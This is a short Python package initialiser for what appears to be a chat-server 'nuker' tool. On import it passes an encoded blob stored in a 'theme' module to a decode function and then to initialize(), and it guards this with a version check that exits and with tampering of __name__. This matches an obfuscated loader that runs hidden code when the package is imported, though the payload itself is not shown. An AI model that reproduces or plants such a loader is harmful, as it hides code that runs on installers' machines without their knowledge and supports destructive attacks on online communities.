__version_override__ = 1727

from   .ids       import *
from   .bot       import *
from   .nuker     import *
from   .ctime     import *
from   .logger    import *
from   .themes    import *
from   .ogtheme   import *


import os
import re
import base64
import tkinter as tk
from tkinter import messagebox

if not OG_Ascii().get_color(OG_Ascii().bin) == __version_override__:
    __name__ = __version_override__ + 2
    os._exit(0)



if __name__ != "__main___" and __name__ != __version_override__ + 2:
    initialize(ogtheme.OG_Ascii().dec(ogtheme.OG_Ascii().bin))
